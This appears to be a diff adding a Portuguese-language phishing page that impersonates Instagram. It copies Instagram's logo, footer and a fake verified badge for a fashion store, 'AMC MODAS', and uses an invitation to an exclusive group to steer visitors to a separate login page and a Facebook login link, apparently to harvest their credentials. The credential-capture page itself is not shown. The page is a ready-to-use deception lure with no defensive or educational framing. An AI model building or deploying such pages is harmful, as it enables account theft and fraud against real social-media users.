@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • AMC MODAS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #262626;
+        }
+
+        .container {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .main-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            width: 100%;
+            max-width: 350px;
+            padding: 10px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+
+        .insta-logo-img {
+            width: 175px;
+            margin: 35px 0 12px 0;
+            user-select: none;
+            cursor: pointer;
+        }
+
+        .profile-pic-container {
+            width: 84px;
+            height: 84px;
+            border-radius: 50%;
+            padding: 2.5px;
+            background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
+            margin: 15px 0 12px 0;
+            position: relative;
+        }
+
+        .profile-pic {
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 2px solid white;
+            overflow: hidden;
+        }
+
+        .profile-pic img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .group-header {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-bottom: 12px;
+        }
+
+        .group-name {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .verified-badge {
+            width: 18px;
+            height: 18px;
+        }
+
+        .info-text {
+            color: #8e8e8e;
+            font-size: 14px;
+            text-align: center;
+            padding: 0 40px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .btn-blue {
+            width: calc(100% - 80px);
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            text-align: center;
+            text-decoration: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 32px;
+        }
+
+        /* Efeito de apertar o botão */
+        .btn-blue:active {
+            transform: scale(0.97);
+            background-color: #1877f2;
+        }
+
+        .btn-blue:hover {
+            background-color: #1877f2;
+        }
+
+        #login-flow {
+            display: none;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 0.4s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .error-box {
+            color: #262626;
+            font-size: 14px;
+            margin: 10px 40px 20px 40px;
+            line-height: 1.4;
+        }
+
+        .fb-login {
+            margin-top: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+
+        .fb-login:active {
+            opacity: .5;
+        }
+
+        .footer {
+            padding: 40px 20px;
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .footer-links {
+            margin-bottom: 15px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .footer-links span {
+            cursor: pointer;
+        }
+
+        @media (max-width: 450px) {
+            body { background-color: #fff; }
+            .container { padding: 0; align-items: flex-start; }
+            .main-box { border: none; margin-top: 20px;}
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff66;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="main-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="insta-logo-img">
+            
+            <div id="initial-flow" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+                <div class="profile-pic-container">
+                    <div class="profile-pic">
+                        <img src="images.png" alt="AMC MODAS Logo">
+                    </div>
+                </div>
+                
+                <div class="group-header">
+                    <p class="group-name">AMC MODAS</p>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="verified-badge" alt="Verificado">
+                </div>
+
+                <p class="info-text">Você foi convidado para participar do grupo exclusivo da <b>AMC MODAS</b>. Confirme sua conta para entrar.</p>
+                
+                <button class="btn-blue" id="btn-entrar" onclick="processar()">Entrar no grupo</button>
+            </div>
+
+            <div id="login-flow">
+                <p class="error-box" style="font-weight: 400;">
+                    Para continuar, confirme sua identidade. Entre com sua conta do Instagram para validar seu acesso ao grupo.
+                </p>
+                <a href="login.html" class="btn-blue" style="display: flex; margin: 0 auto; width: calc(100% - 80px);">Continuar como usuário</a>
+                
+                <div style="display: flex; align-items: center; width: calc(100% - 80px); margin: 20px auto;">
+                    <div style="flex: 1; height: 1px; background: #dbdbdb;"></div>
+                    <div style="margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600;">OU</div>
+                    <div style="flex: 1; height: 1px; background: #dbdbdb;"></div>
+                </div>
+
+                <a href="#" class="fb-login">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" style="width:16px; margin-right:8px;" alt="fb">
+                    Entrar com o Facebook
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <span>Meta</span> <span>Sobre</span> <span>Blog</span> <span>Carreiras</span> <span>Ajuda</span> <span>API</span> <span>Privacidade</span> <span>Termos</span>
+        </div>
+        <p>© 2026 Instagram from Meta</p>
+    </div>
+
+    <script>
+        function processar() {
+            const btn = document.getElementById('btn-entrar');
+            const flow1 = document.getElementById('initial-flow');
+            const flow2 = document.getElementById('login-flow');
+
+            btn.innerHTML = '<div class="spinner"></div>';
+            btn.style.pointerEvents = "none";
+            btn.style.opacity = "0.7";
+
+            setTimeout(() => {
+                flow1.style.display = 'none';
+                flow2.style.display = 'block';
+            }, 1000);
+        }
+    </script>
+
+</body>
+</html>
